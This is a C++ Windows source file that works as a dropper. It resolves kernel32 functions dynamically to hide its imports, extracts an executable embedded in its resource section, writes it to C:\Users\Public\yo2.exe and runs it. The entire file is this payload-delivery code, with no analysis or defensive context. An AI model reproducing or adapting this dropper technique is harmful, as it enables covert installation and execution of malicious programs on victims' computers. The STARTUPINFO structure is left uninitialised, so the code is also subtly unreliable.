#include "resource.h"
#include "helper.h"
#include <stdio.h>


int main()
{
	HINSTANCE handleKernel32Dll = LoadLibrary(TEXT("kernel32.dll"));

	FARPROC fpVirtualAlloc = GetProcAddress(handleKernel32Dll, "VirtualAlloc");
	FARPROC fpFindResource = GetProcAddress(handleKernel32Dll, "FindResourceW");
	FARPROC fpLoadResource = GetProcAddress(handleKernel32Dll, "LoadResource");
	FARPROC fpLockResource = GetProcAddress(handleKernel32Dll, "LockResource");
	FARPROC fpSizeofResource = GetProcAddress(handleKernel32Dll, "SizeofResource");

	_K32VirtualAlloc K32VirtualAlloc = (_K32VirtualAlloc)fpVirtualAlloc;
	_K32FindResource K32FindResource = (_K32FindResource)fpFindResource;
	_K32LoadResource K32LoadResource = (_K32LoadResource)fpLoadResource;
	_K32LockResource K32LockResource = (_K32LockResource)fpLockResource;
	_K32SizeofResource K32SizeofResource = (_K32SizeofResource)fpSizeofResource;


	/* Find and load exe stored in the PE's resource section */
	HRSRC resource = K32FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	HGLOBAL resourceData = K32LoadResource(NULL, resource);

	/* Get pointer to the resource base address */
	LPVOID lpBaseAddressResource = K32LockResource(resourceData);

	DWORD rsrcSize = K32SizeofResource(NULL, resource);

	PBYTE codeBuf = new BYTE[rsrcSize];

	STARTUPINFO si;
	PROCESS_INFORMATION pi;


	if (!CopyMemory(
		codeBuf,
		lpBaseAddressResource,
		rsrcSize)
		)
	{
		return -1;
	}

	HANDLE  hFile = CreateFile(L"C:\\Users\\Public\\yo2.exe",                // name of the write
							   GENERIC_WRITE,          // open for writing
							   0,                      // do not share
							   NULL,                   // default security
							   CREATE_NEW,             // create new file only
							   FILE_ATTRIBUTE_NORMAL,  // normal file
							   NULL);                  // no attr. template

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Test: %i\n", GetLastError());
		return -1;
	}

	DWORD bytesWritten;
	WriteFile(
		hFile,            // Handle to the file
		codeBuf,  // Buffer to write
		rsrcSize,   // Buffer size
		&bytesWritten,    // Bytes written
		nullptr);         // Overlapped

	 // Close the handle once we don't need it.
	CloseHandle(hFile);

	if (!CreateProcess(L"C:\\Users\\Public\\yo2.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		printf("Test: %i\n", GetLastError());
		return -1;
	}

	


	return 0;
}